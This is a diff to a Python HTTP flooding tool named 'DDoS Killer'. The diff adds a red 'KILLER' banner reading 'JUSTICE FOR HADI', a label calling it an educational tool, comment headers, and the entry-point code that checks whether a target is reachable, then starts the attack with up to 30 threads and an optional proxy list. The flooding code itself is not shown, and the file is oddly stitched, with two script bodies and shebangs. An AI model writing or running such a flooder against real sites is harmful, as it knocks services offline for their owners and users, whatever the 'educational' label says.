@@ -1,7 +1,50 @@
 #!/usr/bin/python3
+
+# -------------------------------
+# Imports
+# -------------------------------
+import sys
+
+# -------------------------------
+# Banner Function
+# -------------------------------
+def banner():
+    RED = "\033[1;91m"
+    RESET = "\033[0m"
+
+    print(RED + r"""
+██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
+██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
+█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
+██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
+██║  ██╗██║███████╗███████╗███████╗██║  ██║
+╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+
+        ☠ JUSTICE FOR HADI ☠
+""" + RESET)
+
+
+# -------------------------------
+# Main Tool Logic
+# -------------------------------
+def main():
+    banner()  # 🔴 tool start হলে banner show হবে
+
+    print("Tool started successfully")
+    print("Do your legit operations here...")
+
+
+# -------------------------------
+# Entry Point
+# -------------------------------
+if __name__ == "__main__":
+    main()
+#!/usr/bin/python3
 """
-DDoS Killer
+DDoS Killer – Educational Tool
 --------------------------------
+A minimal, multi‑threaded HTTP flooder for teaching purposes only.
+"""
 
 # --------------------------------------------------------------------------- #
 # Imports
@@ -382,6 +425,7 @@ def main(target: str, threads_count: int, proxy_file: str | None = None):
 
 
 # --------------------------------------------------------------------------- #
+# Signal handler
 # --------------------------------------------------------------------------- #
 def _sigint_handler(signum, frame):
     """
@@ -391,6 +435,7 @@ def _sigint_handler(signum, frame):
 
 
 # --------------------------------------------------------------------------- #
+# Argument parsing
 # --------------------------------------------------------------------------- #
 def _parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
@@ -425,7 +470,7 @@ if __name__ == "__main__":
 
     args = _parse_args()
 
-    # 1️ Baseline test – make sure the target is reachable
+    # 1️⃣ Baseline test – make sure the target is reachable
     baseline = test_connection(args.target)
     if baseline["avg_response"] is None:
         print("[!] Target appears to be unreachable – aborting.")
@@ -433,9 +478,10 @@ if __name__ == "__main__":
 
     print(f"[+] Baseline: {baseline}")
 
-     # 2️ Kick off the attack
+     # 2️⃣ Kick off the attack
     main(
         target=args.target,
         threads_count=min(args.threads, 30),          # Cap threads at 30
         proxy_file=args.proxy_file,
     )
+
